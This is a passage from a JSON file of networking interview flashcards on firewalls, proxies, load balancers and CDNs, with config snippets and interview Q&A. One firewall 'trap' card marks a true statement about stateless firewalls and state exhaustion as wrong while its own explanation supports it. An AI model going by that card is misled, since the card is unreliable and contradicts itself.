          "RTT measures transmission + propagation + queuing + processing delays."
        ],
        "whenToUse": "Network latency troubleshooting, packet loss localization, and ISP routing audits."
      }
    }
  ],
  "firewall": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Firewalls: Packet Filtering, Stateful Inspection & WAF?",
      "inSimpleWords": "A firewall is a network security system that monitors, filters, and controls incoming and outgoing network traffic based on predetermined security rules, operating across Layers 3, 4, and 7.",
      "analogy": "Building security: Packet Filter is a guard checking ID names against a static guest list; Stateful Firewall remembers you walked out to grab coffee and lets you back in; Web Application Firewall (WAF) inspects your backpack for concealed weapons (SQL injection / XSS).",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Firewalls: Packet Filtering, Stateful Inspection & WAF?",
      "problem": "Exposing internal databases, management ports (SSH/RDP), and servers directly to the public Internet invites port scans, brute-force attacks, and remote code execution.",
      "whyItMatters": "Firewalls establish the primary perimeter defense separating trusted internal corporate networks from untrusted public Internet traffic.",
      "howSolves": "Inspects packet headers and payloads against Access Control Lists (ACLs), tracks TCP connection state tables, and performs deep packet inspection (DPI) to block malicious traffic."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Firewalls: Packet Filtering, Stateful Inspection & WAF work?",
      "steps": [
        {
          "step": 1,
          "title": "Stateless Packet Filtering (L3/L4)",
          "desc": "Evaluates each packet independently against static rules (Src IP, Dest IP, Port, Protocol). Fast, but blind to session context."
        },
        {
          "step": 2,
          "title": "Stateful Inspection (L4)",
          "desc": "Maintains a state table tracking active TCP/UDP connections. Automatically permits return traffic for legitimate outbound sessions."
        },
        {
          "step": 3,
          "title": "Next-Gen Firewall (NGFW)",
          "desc": "Combines stateful inspection with Deep Packet Inspection (DPI), IPS/IDS, and user identity awareness."
        },
        {
          "step": 4,
          "title": "Web Application Firewall (WAF / L7)",
          "desc": "Inspects HTTP/HTTPS payloads for Layer 7 attacks: SQL Injection, Cross-Site Scripting (XSS), and CSRF."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Stateless ACL": "Permit/Deny based on 5-tuple without tracking session state",
        "Stateful Connection Table": "Protocol | Src IP:Port | Dest IP:Port | State (ESTABLISHED) | Timeout",
        "WAF (Layer 7)": "Cloudflare, AWS WAF, ModSecurity (inspects HTTP URLs, headers, POST bodies)",
        "Default Security Posture": "Default Deny (implicit deny all traffic unless explicitly permitted)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "An internal employee visits a news website. The news server sends back HTML and image packets.",
      "challenge": "The company firewall blocks all unsolicited inbound connections from the Internet.",
      "resolution": "Because the firewall is STATEFUL, it recorded the employee's outbound request in its connection table and automatically permits the returning news packets.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Stateless Rule": "iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT",
        "Stateful Rule": "iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
        "WAF Rule": "Block requests containing `OR 1=1` or `<script>` in query parameters",
        "Implicit Deny": "The final invisible rule at the bottom of every firewall: `DENY ALL`"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Firewalls: Packet Filtering, Stateful Inspection & WAF. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A stateful firewall requires separate rules for outbound requests and inbound replies.",
          "why": "Stateful firewalls automatically track connection state.",
          "correct": "Stateful firewalls automatically permit return traffic matching an established outbound session in their state table."
        },
        {
          "wrong": "A standard network firewall protects against SQL Injection and XSS attacks.",
          "why": "Layer 3/4 firewalls only inspect IP addresses and port numbers; they cannot read HTTP payloads.",
          "correct": "Layer 7 attacks (SQLi, XSS) require a Web Application Firewall (WAF) that decrypts and parses HTTP traffic."
        },
        {
          "wrong": "Stateless firewalls are immune to state exhaustion attacks.",
          "why": "Stateless firewalls have no state table, which is their primary performance advantage.",
          "correct": "Stateless firewalls consume minimal memory because they maintain zero state tables, but offer weaker security."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between a Stateless Packet Filter, a Stateful Firewall, and a Web Application Firewall (WAF)?",
          "a": "1. Stateless Packet Filter (Layer 3/4): Inspects each packet in isolation against static rules (Source IP, Dest IP, Port, Protocol). It has no memory of past packets and cannot tell if an incoming packet is a response to an outbound request. Fast hardware execution, but requires opening broad return port ranges. 2. Stateful Firewall (Layer 4): Tracks the state of active network connections in a dynamic state table. It validates TCP handshakes and automatically permits inbound return packets matching an active outbound session. Blocks unsolicited inbound scans. 3. Web Application Firewall (WAF / Layer 7): Operates at the Application Layer. It terminates TLS, parses HTTP headers, cookies, and POST bodies, and applies regex inspection to detect application-level exploits such as SQL Injection, Cross-Site Scripting (XSS), and remote code execution (e.g. Log4j).",
          "tip": "Contrast the layers clearly: Stateless = L3/L4 static; Stateful = L4 connection table; WAF = L7 HTTP payload inspection."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Stateless = static 5-tuple; Stateful = tracks connection table; WAF = inspects HTTP for SQLi/XSS.",
        "summaryPoints": [
          "Default security rule is 'Implicit Deny All'.",
          "Stateful inspection permits return traffic automatically without opening inbound ports.",
          "WAF operates at Layer 7 to protect against OWASP Top 10 vulnerabilities.",
          "Next-Gen Firewalls (NGFW) integrate Deep Packet Inspection and Intrusion Prevention (IPS)."
        ],
        "whenToUse": "Cloud security groups, enterprise perimeter defense, and web application protection."
      }
    }
  ],
  "proxy-servers": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Forward Proxy Servers & Anonymity Mechanics?",
      "inSimpleWords": "A Forward Proxy is an intermediary server that sits between client devices and the public Internet, intercepting outbound requests to provide anonymity, caching, content filtering, and corporate security enforcement.",
      "analogy": "An assistant running errands: instead of you going into a store yourself, you give the shopping list to your assistant (proxy). The store only sees the assistant, sells them the goods, and the assistant brings the items back to you.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Forward Proxy Servers & Anonymity Mechanics?",
      "problem": "Enterprise networks need to prevent employees from visiting phishing websites, log corporate outbound data leaks, and cache repetitive downloads without re-fetching across expensive WAN links.",
      "whyItMatters": "Forward proxies protect client identities, enforce corporate acceptable use policies, and reduce bandwidth usage through shared caching.",
      "howSolves": "Clients configure their browsers to send all outbound requests to the proxy IP. The proxy establishes connections to destination web servers on the client's behalf."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Forward Proxy Servers & Anonymity Mechanics work?",
      "steps": [
        {
          "step": 1,
          "title": "Client Request Interception",
          "desc": "Client browser sends HTTP request to Proxy Server (e.g. proxy.corp.com:8080)."
        },
        {
          "step": 2,
          "title": "Policy & Cache Check",
          "desc": "Proxy checks URL against blocklists (e.g. gambling/malware). Checks local cache for requested asset."
        },
        {
          "step": 3,
          "title": "Proxy Forwarding",
          "desc": "Proxy strips client's private IP, substitutes its own public IP, and forwards request to destination server."
        },
        {
          "step": 4,
          "title": "Response Relay",
          "desc": "Origin server responds to proxy. Proxy inspects response for malware and returns payload to client."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Forward Proxy Direction": "Client -> [Forward Proxy] -> Internet Web Servers",
        "Anonymity Levels": "Transparent (reveals client IP) | Anonymous (hides IP, reveals proxy) | Elite/High (completely conceals proxy presence)",
        "HTTP CONNECT Method": "Establishes raw TCP tunnel through proxy for encrypted HTTPS traffic without proxy decryption",
        "Corporate SSL Inspection": "Proxy installs custom Root CA on employee laptops to decrypt and inspect HTTPS traffic"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A financial bank blocks employee workstations from uploading proprietary source code to personal cloud storage (Dropbox / Google Drive).",
      "challenge": "Employees connect over encrypted HTTPS, hiding the URL path and payload from standard network firewalls.",
      "resolution": "A corporate Forward Proxy performs SSL Decryption (via a trusted corporate root certificate), parses HTTP POST bodies, and blocks unauthorized file uploads.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Squid Proxy": "Popular open-source forward proxy and web cache",
        "Tor Network": "Onion routing using multi-hop forward proxies for extreme anonymity",
        "HTTP CONNECT Header": "CONNECT example.com:443 HTTP/1.1",
        "PAC File": "Proxy Auto-Configuration file distributing proxy rules to client browsers"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Forward Proxy Servers & Anonymity Mechanics. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A Forward Proxy and a Reverse Proxy are the exact same thing.",
          "why": "They sit on opposite sides of the Internet.",
          "correct": "A Forward Proxy represents and protects the CLIENTS; a Reverse Proxy represents and protects the SERVERS."
        },
        {
          "wrong": "Standard forward proxies can inspect HTTPS payloads without any client configuration.",
          "why": "HTTPS is end-to-end encrypted; attempting decryption triggers severe browser certificate warnings.",
          "correct": "HTTPS inspection requires pre-installing the proxy's private CA certificate in the client's trusted root store."
        },
        {
          "wrong": "Using a free online proxy makes you 100% untraceable.",
          "why": "Free proxies frequently log user traffic, inject malware/ads, and report activities to authorities.",
          "correct": "Untrusted proxies can read all unencrypted traffic and session cookies."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the architectural difference between a Forward Proxy and a Reverse Proxy?",
          "a": "1. Forward Proxy (Client-Facing): Sits in front of client devices. Clients explicitly configure their browsers or network gateways to route through it. The destination web server has no idea who the real client is; it only sees the Forward Proxy's IP address. Primary purposes: client anonymity, bypassing geo-restrictions, corporate content filtering, and outbound caching. 2. Reverse Proxy (Server-Facing): Sits in front of origin backend servers. Clients connect to the reverse proxy's public IP thinking it is the actual website. The reverse proxy terminates the connection and forwards the request to internal backend microservices. The client has no idea which backend server handled the request. Primary purposes: load balancing, SSL/TLS termination, DDoS protection, web caching, and hiding internal microservice topology.",
          "tip": "Mnemonic: 'Forward proxy shields the client; Reverse proxy shields the server.'"
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Forward Proxy protects and represents CLIENTS. Origin servers only see the proxy's IP address.",
        "summaryPoints": [
          "Acts on behalf of clients navigating outbound to the Internet.",
          "Enforces corporate content filtering, URL blocking, and outbound data loss prevention.",
          "Provides anonymity by hiding client IP addresses from destination web servers.",
          "Uses HTTP `CONNECT` method to tunnel HTTPS traffic."
        ],
        "whenToUse": "Enterprise network governance, web scraping, user privacy, and outbound caching."
      }
    }
  ],
  "reverse-proxy": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Reverse Proxy?",
      "inSimpleWords": "A Reverse Proxy is a server that sits in front of one or more origin web servers, intercepting incoming client requests and routing them to appropriate backend microservices while providing SSL termination, caching, and security.",
      "analogy": "The receptionist at a corporate headquarters: visitors (clients) only talk to the receptionist. The receptionist routes sales inquiries to the 4th floor and engineering issues to the 2nd floor, without visitors ever knowing the building's internal layout.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Reverse Proxy?",
      "problem": "Exposing raw Node.js, Python, or Go microservices directly to the public Internet leaves them vulnerable to slow-client attacks, requires duplicate SSL certificate management, and prevents seamless zero-downtime deployments.",
      "whyItMatters": "Virtually every modern web application architecture in production (NGINX, Envoy, Traefik, HAProxy) uses reverse proxies as the front entrance.",
      "howSolves": "Reverse proxies terminate TLS connections in hardware, serve cached static assets, compress payloads with Gzip/Brotli, and route requests across internal backend servers."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Reverse Proxy work?",
      "steps": [
        {
          "step": 1,
          "title": "Client Request Ingress",
          "desc": "Public client connects to single public IP: https://api.example.com on port 443."
        },
        {
          "step": 2,
          "title": "SSL/TLS Termination",
          "desc": "Reverse proxy decrypts TLS using its certificate, offloading CPU-intensive crypto from backend servers."
        },
        {
          "step": 3,
          "title": "Header Enrichment",
          "desc": "Appends headers: `X-Forwarded-For: <client_ip>`, `X-Forwarded-Proto: https`, and `X-Request-ID`."
        },
        {
          "step": 4,
          "title": "Upstream Proxying",
          "desc": "Forwards plain HTTP request to private backend service (e.g. http://10.0.1.15:8080) over low-latency internal network."
        }
      ],
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Public Ingress": "Single public IP:Port (443) receiving all external traffic",
        "SSL Offloading / Termination": "Handles cryptographic certificates at perimeter; internal transit uses fast cleartext HTTP",
        "Path-Based Routing": "Routes `/api` to Node.js cluster, `/static` to S3 cache, `/auth` to Go service",
        "Upstream Pool": "Monitors backend health checks and balances load across redundant instances"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A company runs 20 internal Docker microservices written in Python, Node.js, and Java.",
      "challenge": "How can the company expose all 20 services under a single domain (example.com) with one SSL certificate?",
      "resolution": "Deploy NGINX as a Reverse Proxy. NGINX manages the SSL certificate and routes `/users` to Node.js, `/billing` to Java, and `/ai` to Python.",
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "NGINX Proxy Pass": "location /api/ { proxy_pass http://backend_pool; }",
        "SSL Termination": "ssl_certificate /etc/ssl/cert.pem; ssl_certificate_key /etc/ssl/key.pem;",
        "X-Forwarded-For Header": "X-Forwarded-For: 203.0.113.195 (preserves original client IP for backend logs)",
        "Popular Technologies": "NGINX, Envoy Proxy, Caddy, Traefik, HAProxy, AWS ALB"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Reverse Proxy (NGINX) Architecture & SSL Offloading. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Backend servers behind a reverse proxy see the client's real IP address in `req.ip` by default.",
          "why": "The backend server connects to the reverse proxy, so `req.ip` is the PROXY's internal IP address.",
          "correct": "Backend servers must read the `X-Forwarded-For` header injected by the reverse proxy to identify the real client IP."
        },
        {
          "wrong": "A reverse proxy cannot cache dynamic API responses.",
          "why": "Reverse proxies can cache any response honoring `Cache-Control` headers.",
          "correct": "Reverse proxies can cache dynamic API responses using microcaching (e.g. caching for 1-5 seconds to survive traffic spikes)."
        },
        {
          "wrong": "Reverse proxies introduce too much latency to be useful in production.",
          "why": "NGINX event-driven asynchronous architecture adds under 1 millisecond of processing latency.",
          "correct": "The microsecond proxy delay is vastly outweighed by the performance gains of SSL offloading, connection pooling, and static file caching."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is 'SSL Termination' (SSL Offloading) on a reverse proxy, and what are its architectural advantages and security considerations?",
          "a": "SSL Termination is the practice of terminating and decrypting incoming HTTPS connections at the reverse proxy perimeter, before forwarding the decrypted HTTP requests over the internal private network to backend application servers. Architectural Advantages: 1. CPU Offloading: Decrypting asymmetric ciphers is computationally expensive; offloading crypto to the reverse proxy frees up backend application servers to focus on business logic. 2. Centralized Certificate Management: Only the reverse proxy needs certificate renewals (Let's Encrypt / DigiCert); backend servers do not require individual certificates. 3. Payload Inspection & Caching: Allows the proxy to inspect HTTP headers, compress responses (gzip/brotli), and cache static assets. Security Consideration: Traffic between the reverse proxy and backend servers travels unencrypted in cleartext. In Zero-Trust architectures (HIPAA, PCI-DSS), 'SSL Bridging' (re-encrypting traffic between proxy and backend) is required.",
          "tip": "Mention both advantages (CPU offloading, centralized certs) and the zero-trust caveat (cleartext internal traffic)."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Reverse Proxy protects and represents SERVERS. Manages SSL termination, path routing, and load balancing.",
        "summaryPoints": [
          "Shields internal backend microservices from direct public Internet exposure.",
          "Terminates SSL/TLS certificates centrally at the perimeter.",
          "Injects `X-Forwarded-For` to communicate original client IP to backend services.",
          "Enables zero-downtime blue-green deployments by dynamically switching upstream targets."
        ],
        "whenToUse": "Every production web architecture, API gateway, microservice mesh, and Docker/Kubernetes ingress."
      }
    }
  ],
  "load-balancer": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Load Balancers?",
      "inSimpleWords": "A Load Balancer distributes incoming network traffic across a cluster of backend servers to optimize resource utilization, maximize throughput, minimize response latency, and prevent server overload.",
      "analogy": "Bank tellers: customers stand in a single queue; the receptionist (load balancer) sends the next customer to whichever teller just finished, ensuring no single teller is buried with work while others sit idle.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Load Balancers?",
      "problem": "A single web server can handle 5,000 concurrent users. When traffic surges to 50,000 users during a flash sale, the server crashes with out-of-memory errors.",
      "whyItMatters": "Load balancing provides horizontal scalability (adding more servers instead of buying a bigger computer) and high availability with automated health failover.",
      "howSolves": "A load balancer distributes requests across server pools using algorithms (Round Robin, Least Connections, IP Hash) and stops sending traffic to unhealthy nodes."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Load Balancers work?",
      "steps": [
        {
          "step": 1,
          "title": "Traffic Arrival",
          "desc": "Clients connect to single public Virtual IP (VIP) on port 80/443."
        },
        {
          "step": 2,
          "title": "Health Check Evaluation",
          "desc": "Load balancer checks background health status (`GET /healthz`). Unhealthy nodes are removed from pool."
        },
        {
          "step": 3,
          "title": "Algorithm Dispatch",
          "desc": "Evaluates algorithm (Round Robin, Least Connections, IP Hash, Weighted) to select optimal healthy server."
        },
        {
          "step": 4,
          "title": "Forwarding & Persistence",
          "desc": "Proxies request to chosen server. Sticky sessions (session affinity) ensure stateful users stay on same server."
        }
      ],
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Layer 4 Load Balancer (NLB)": "Operates at Transport layer (IP + TCP/UDP Port). Extremely fast, packet-level, no decryption, millions of req/s",
        "Layer 7 Load Balancer (ALB)": "Operates at Application layer (HTTP/HTTPS). Smart routing (URL paths, headers, cookies), SSL termination, slower CPU",
        "Round Robin": "Sequentially cycles through servers (A -> B -> C -> A)",
        "Least Connections": "Sends request to server currently handling the fewest active connections",
        "IP Hash": "Hashes client IP to ensure same client consistently reaches same backend server"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A retail website handles 100,000 requests per minute across 5 backend servers. Server #3 experiences a kernel panic and crashes.",
      "challenge": "If requests continue routing to Server #3, 20% of customer checkout attempts will fail.",
      "resolution": "The load balancer's active health check detects Server #3 failed 3 consecutive ping checks, marks it DEAD within 3 seconds, and routes 100% of traffic across the remaining 4 healthy servers.",
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Weighted Round Robin": "Server A (weight 3) receives 3x more traffic than Server B (weight 1)",
        "Layer 4 Technology": "AWS NLB, Linux IPVS, HAProxy (mode tcp)",
        "Layer 7 Technology": "AWS ALB, NGINX, HAProxy (mode http), Traefik",
        "Health Check": "GET /healthz HTTP/1.1 -> expects HTTP 200 within 2000 ms"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Load Balancers (Layer 4 vs Layer 7 & Algorithms). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Round Robin is the best algorithm for long-lived database connections or file uploads.",
          "why": "Some requests take 100ms while others take 10 minutes, causing server imbalance.",
          "correct": "For requests with uneven processing times, Least Connections or Weighted Least Connections is vastly superior to Round Robin."
        },
        {
          "wrong": "A Layer 4 load balancer can route requests based on HTTP cookies.",
          "why": "Layer 4 operates strictly on TCP/UDP packets; it cannot inspect application-layer HTTP cookies.",
          "correct": "Cookie-based routing and sticky sessions require a Layer 7 Application Load Balancer."
        },
        {
          "wrong": "A load balancer eliminates all single points of failure.",
          "why": "The load balancer itself is a single point of failure if deployed as a single hardware box.",
          "correct": "Production architectures use redundant Active/Passive load balancer pairs sharing a Virtual IP via VRRP / Keepalived."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What are the key trade-offs between Layer 4 (L4) and Layer 7 (L7) Load Balancers?",
          "a": "1. Layer 4 (Transport Layer): Operates at IP and TCP/UDP port levels. It inspects only the first SYN packet, makes a routing decision, and passes raw packets through via NAT or Direct Server Return (DSR). Pros: Extreme performance (millions of packets/sec), minimal CPU and memory overhead, protocol agnostic. Cons: Blind to application payload; cannot inspect HTTP headers, cookies, or URL paths; cannot terminate SSL/TLS. 2. Layer 7 (Application Layer): Operates at the HTTP/HTTPS layer. It terminates the TCP connection, decrypts SSL/TLS, and parses the full HTTP request (URL paths, headers, cookies, HTTP methods). Pros: Intelligent routing (e.g. /video -> media cluster, /checkout -> payments cluster), sticky sessions via cookies, SSL termination, and WAF security filtering. Cons: Higher CPU/RAM overhead; lower raw packet throughput compared to L4.",
          "tip": "Summarize with: L4 = packet-level speed & throughput; L7 = content-aware intelligence & flexibility."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "L4 = fast TCP/UDP routing; L7 = smart HTTP path/cookie routing. Algorithms: Round Robin, Least Connections, IP Hash.",
        "summaryPoints": [
          "Distributes client traffic horizontally to prevent server bottlenecks.",
          "Active health checks (`/healthz`) automatically isolate crashed backend nodes.",
          "Round Robin for uniform workloads; Least Connections for uneven long-lived requests.",
          "Sticky sessions (session affinity) bind a client to one server via cookies."
        ],
        "whenToUse": "Horizontal cloud scaling, zero-downtime microservices, and high-availability system design."
      }
    }
  ],
  "cdn-content-delivery-network": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is CDN?",
      "inSimpleWords": "A Content Delivery Network (CDN) is a geographically distributed network of proxy edge servers (Points of Presence, PoPs) that cache and deliver web assets close to end users to minimize latency.",
      "analogy": "A national e-commerce warehouse: instead of shipping every book directly from Seattle to buyers in Mumbai, Amazon stores copies of popular books in a local Mumbai fulfillment center (CDN edge) for 1-day delivery.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need CDN?",
      "problem": "Light travels through fiber at ~200,000 km/s. A user in Sydney requesting a 10 MB video from an origin server in London incurs a mandatory 300 ms round-trip propagation delay per packet.",
      "whyItMatters": "CDNs serve over 80% of global internet traffic today, drastically reducing origin server loads and speeding up page load times worldwide.",
      "howSolves": "Uses BGP Anycast routing to direct users to their nearest physical edge data center, serving static assets (images, CSS, JS, video) directly from local SSD cache."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does CDN work?",
      "steps": [
        {
          "step": 1,
          "title": "BGP Anycast Routing",
          "desc": "User requests cdn.example.com. BGP Anycast routes DNS query to physically closest edge PoP."
        },
        {
          "step": 2,
          "title": "Edge Cache Inspection",
          "desc": "Edge server checks local cache for requested URL."
        },
        {
          "step": 3,
          "title": "Cache Hit (95% cases)",
          "desc": "File found! Edge server delivers asset immediately within 5-15 ms round-trip time."
        },
        {
          "step": 4,
          "title": "Cache Miss & Origin Fetch",
          "desc": "File missing: Edge server fetches asset from origin server, caches it locally for TTL duration, and serves to user."
        }
      ],
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Origin Server": "The master central application server holding authoritative data",
        "Edge PoP (Point of Presence)": "Edge data centers located in hundreds of cities worldwide (Cloudflare, Akamai, CloudFront)",
        "Anycast DNS": "Same IP address advertised by multiple edge data centers worldwide; routers automatically find nearest path",
        "Cache Invalidation": "Purging stale edge assets via API when new code/media is deployed"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A viral breaking news article attracts 50 million visitors within 10 minutes.",
      "challenge": "The newspaper's single origin web server can only support 10,000 concurrent requests before crashing.",
      "resolution": "A CDN caches the static article at 300 edge locations worldwide. 99.8% of requests are served directly by edge servers (Cache Hit Ratio = 99.8%), protecting the origin server from collapse.",
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Top CDNs": "Cloudflare, Akamai, AWS CloudFront, Fastly, Google Cloud CDN",
        "Cache Hit Ratio (CHR)": "Target > 90% for static assets (Hits / Total Requests * 100)",
        "Dynamic Content Acceleration": "TCP connection reuse between Edge and Origin reduces TLS latency for dynamic API calls"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for CDN (Content Delivery Network) & Edge Caching. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "load-balancer"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "CDNs can only ever cache static images and CSS files.",
          "why": "Modern CDNs run Edge Compute (Cloudflare Workers, Lambda@Edge) and accelerate dynamic APIs.",
          "correct": "Modern CDNs terminate TCP/TLS at the edge and proxy dynamic API requests over optimized private fiber backbones."
        },
        {
          "wrong": "Deploying a CDN completely eliminates the need for an origin server.",
          "why": "On a cache miss or cache purge, the CDN must fetch original assets from the origin.",
          "correct": "The origin server remains the authoritative source of truth for all content."
        },
        {
          "wrong": "Cache invalidation across a global CDN is instantaneous.",
          "why": "Propagating purge signals across 300 global data centers takes seconds to minutes.",
          "correct": "CDN cache invalidation has propagation latency; use content-hashed URLs for instant asset versioning."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is BGP Anycast and how do CDNs use it to direct users to their nearest edge server?",
          "a": "BGP Anycast is an IP network addressing technique where multiple geographically distributed physical edge servers share and advertise the EXACT SAME IP address to global internet routers using BGP. When a client's computer sends a packet to that Anycast IP address, global Internet Service Provider (ISP) routers evaluate their BGP routing tables and automatically forward the packet along the shortest topological path (lowest AS-path hop count). Consequently, a user in Tokyo connects to the CDN's Tokyo data center, while a user in London connecting to the exact same IP address connects to the London data center. Anycast eliminates DNS geo-lookup latency, provides instant DDoS absorption across all global PoPs, and provides automatic failover if an edge site goes down.",
          "tip": "Explain: 'Multiple physical servers advertise the same IP; BGP routes packets to the topologically closest server.'"
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "CDN caches content at edge PoPs close to users via BGP Anycast, cutting latency from 250ms to 15ms.",
        "summaryPoints": [
          "Points of Presence (PoPs) store static assets in local SSD caches worldwide.",
          "BGP Anycast routes traffic to the nearest geographic edge location automatically.",
          "Protects origin servers from traffic spikes during viral events and DDoS attacks.",
          "High Cache Hit Ratio (>90%) minimizes cloud bandwidth egress costs."
        ],
        "whenToUse": "Global web performance, media streaming, DDoS protection, and static asset distribution."
      }
    }
  ],
  "network-troubleshooting": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Network Troubleshooting Methodology?",
      "inSimpleWords": "A systematic, disciplined engineering methodology for diagnosing, localizing, and resolving network connectivity and performance failures using a structured bottom-up or top-down approach.",
      "analogy": "A doctor diagnosing illness: you don't immediately perform open-heart surgery; you start by checking vital signs (pulse, temperature, breathing), isolate the affected organ, and administer targeted treatment.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Network Troubleshooting Methodology?",
      "problem": "Novice engineers guess randomly when a website won't load ('Maybe restart the server? Maybe clear DNS? Maybe reinstall Wi-Fi?'), wasting hours without identifying the root cause.",
      "whyItMatters": "Site Reliability Engineers (SREs), DevOps, and systems administrators must rapidly isolate production outages under intense pressure.",
